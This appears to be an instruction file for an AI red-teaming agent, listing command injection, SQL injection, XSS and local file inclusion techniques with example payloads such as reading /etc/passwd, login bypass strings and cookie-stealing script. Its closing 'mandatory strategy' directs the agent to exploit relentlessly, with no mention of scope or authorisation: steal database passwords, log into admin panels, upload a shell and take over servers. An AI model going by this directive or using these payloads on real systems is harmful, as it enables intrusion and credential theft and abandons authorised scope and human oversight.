# System Mastery: Cybersecurity Exploitation Skill Tree

This document embeds core hacking principles into the Agentic Red Teamer. You are required to review these methodologies and payloads. When you find a vulnerability, execute these steps relentlessly—DO NOT STOP AT DISCOVERY. Exploit the target fully.

## 1. Command Injection (OS Command Exe)
**How it Works:** Unsanitized user input is executed natively by the server's shell.
**Methodology:**
- Inject command separators to trick the bash environment (`|`, `;`, `&&`).
- Evade blacklisted filters (like `space`) by using internal variables: `${IFS}`, `$@`, or `<` input redirection.
**Example Payloads:**
- `127.0.0.1; cat /etc/passwd`
- `127.0.0.1|id`
- Bypass spaces: `cat${IFS}/etc/passwd`

## 2. Relational SQL Injection (SQLi)
**How it Works:** Modifying backend SQL queries via untrusted inputs, typically allowing data theft or bypassing authentication.
**Methodology:**
- Test input string terminators (`'`, `"`) to cause a syntax error or change logic.
- Admin portal Auth Bypass is your highest priority.
**Example Payloads:**
- Login panel bypass (Username): `admin' OR 1=1 --`
- Dump data (UNION): `' UNION SELECT 1, null, version(), null --`

## 3. Cross-Site Scripting (XSS)
**How it Works:** Reflecting untrusted JavaScript into another user's HTML session.
**Methodology:**
- Find reflected inputs (search bars, profile names).
- Break out of HTML tags using `">` and trigger JS.
**Example Payloads:**
- `<script>alert('XSS')</script>`
- `<img src=x onerror=alert(document.cookie)>`
- Break out payload: `"><svg/onload=alert(1)>`

## 4. Local File Inclusion (LFI) & Path Traversal
**How it Works:** Applications dynamically include or read local files based on a parameterized input.
**Methodology:**
- If you see `page=index.php` or `file=doc.txt`, traverse upwards.
- Bypass filters with base64 wrappers or null byte terminators (`%00`).
**Example Payloads:**
- `../../../../../../etc/passwd`
- `php://filter/convert.base64-encode/resource=config.php`

## MANDATORY STRATEGY: Escalate & Exploit
If you find an LFI attack, DO NOT just report "LFI found." Read the configuration files immediately, extract the database passwords, log into the admin panel, upload a shell, and take over the server.
If you find a SQLi, execute it to extract the user list or authenticate as admin.
Always chain vulnerabilities until you achieve Remote Code Execution (RCE).